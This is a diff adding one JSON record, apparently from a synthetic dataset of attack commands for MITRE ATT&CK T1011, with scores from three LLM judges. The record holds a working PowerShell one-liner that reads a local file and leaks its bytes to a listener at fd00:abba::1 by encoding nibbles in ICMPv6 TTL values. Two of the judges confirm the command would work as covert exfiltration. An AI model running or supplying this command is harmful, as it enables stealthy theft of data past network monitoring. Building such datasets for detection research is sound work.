@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:abba::1'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d -Count 1 -TimeToLive (70 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $d -Count 1 -TimeToLive (100 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Uses ICMPv6 TTL ranges to encode high/low nibbles of each byte, transmitting over ICMPv6 as an alternate medium aligned to T1011.",
+  "rationale_steps": [
+    "Split each byte into two 4-bit values.",
+    "Map nibbles into two distinct TTL ranges for clarity.",
+    "Send sequential ICMPv6 echos that a passive listener can reconstruct."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-3c199886",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid operators, and correct Test-Connection parameters and argument syntax.",
+        "semantic_score": 2,
+        "semantic_justification": "It plausibly encodes data into ICMPv6 hop limits for exfiltration, but this is an alternative network protocol on the same medium rather than a different network medium as defined by T1011.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:24:52.304671Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced parentheses, proper variable assignments, valid foreach loop syntax, correct bitwise operators (-shr, -band), and valid Test-Connection parameters including -IPv6 and -TimeToLive flags.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements a covert channel by encoding file bytes as nibble pairs in ICMPv6 TTL values (70+hi and 100+lo ranges), which aligns with T1011's alternate network medium concept, though the receiver would need a custom sniffer to decode TTL values and the fd00::/8 address is a unique local address (not routable externally), slightly limiting real-world exfiltration plausibility.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:09:23.259307Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid PowerShell syntax, correct bitwise operators (-shr, -band), and properly formatted .NET method calls and cmdlet parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command successfully implements the described logic of encoding file data into ICMPv6 TTL values for covert exfiltration, using two packets per byte to transmit high and low nibbles.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:09:28.661205Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
